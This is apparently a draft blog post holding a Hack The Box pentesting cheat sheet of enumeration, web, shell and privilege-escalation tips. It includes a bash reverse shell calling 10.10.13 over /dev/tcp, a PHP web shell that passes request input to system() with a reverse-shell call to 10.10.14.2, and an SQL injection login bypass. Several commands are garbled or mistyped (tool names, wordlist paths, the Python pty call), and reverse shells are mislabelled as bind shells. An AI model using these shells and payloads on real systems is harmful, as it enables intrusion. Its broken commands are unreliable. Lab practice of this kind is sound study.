---
title: "Hack The Box: Cheat Sheet"
date: DATE
draft: true
tags: ["pentesting","HTB"]
reads: 2
---
### Table of Contents:  
[Linux](#linux)   
[Windows](#windows)     
[Web](#web)    
[Reversing](#reversing)    
[Shells](#shells)    
[Privilege Escalation](#privilege-escalation)    
[Sources](#sources)
# Network Enumeration
## nmap
Run default scripts and enumerate versions
```
nmap -sC -sV -oA example 10.0.0.1
```

Scan All Ports
```
nmap -p- ip -oA example 10.0.0.1
```

## Sparta

GUI that does port scanning and runs enumeration scripts.

## Gobuster
Useful to enumerate directories
```
gobuser dir -u http://10.10.114 -w /usr/share/worldists/dirbuster/miediom -o gobuster.out
````
Don't log http 302 responses.
```
gobuser dir -u http://10.10.114 -w /usr/share/worldists/dirbuster/miediom -o gobuster.out -s 200,204,302,307
```
enumerate after login in using cookie
```
-c cookie to enumerate after login
```

## Sqlmap

```
sqlmap -rlogin.req --dbms mysql -p username --force-ssl
```
# Linux
## Netcat receive bindshell
```
nc -lvnp 9001
```

## Bash bind shell
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.13/9001 0>&1'
```

## Check what commands user can run as sudo
```
sudo -l
```

# Web

## Php Query Database
```
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "select * from profiles");
$reults = pg_fetch_assoc($result);
print_r($results);
?>
```

## PHP bind shell
```
<?php
echo "test";
system($_REQUEST['hello']);
?>

system.php?hello='bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'
```

## PHP regular expression

# Windows

## Just Another Windows Enumeration Script

[Jaws]

# Web

## Robots.txt
check robots.txt for interesting paths.

## Check how recent a file is on a service
Try to `wget` file and than run exiftool on it to see how old it is.

## Javascript

copy obscutated javascript into web console to decode it.


## Burp Suite
To replay requests, right click request in HTTP history and click send to Repeater.
You can use `ctrl u` to url encode parameters.


## SSL
Inpsect the ssl certificate for alternative hostnames and add them to your `/etc/hosts/. Also look for email addresses.

## Sql Injection
If there's client side field validation you be able to do sql injection.
```
email=admin@europacorp.htb; OR '1' = '1&password=password
```
# Shells
[PHP Bind Shell](#php-bind-shell)  
[Netcat Receive BindShell](#bash-bind-shell)    
[Bash Bind Shell](#netcat-receive-bindshell)
## Upgrade python shell to proper shelll
```
python -c 'import pty:pty.spwn("/bin/bash")'\
stty raw -echo
fg
stty rows 34 cols 136
```

# Privilege Escalation

[Check sudo commands](#check-what-commands-user-can-run-as-sudo)

## git hooks code execution
```
cd hooks
touch post-merge
chmod +x post-merge
```


# Reversing
[How to Debug Windows Exe](#how-to-debug-windows-exe)
## Ghidra
tools > search for strings
right click references to address

## How to debug windows exe

x32dbg

## list strings in file
```
strings example.exe
```

# Sources

Ippsec : Bitlab
IppSec : Bart
IppSec : Europa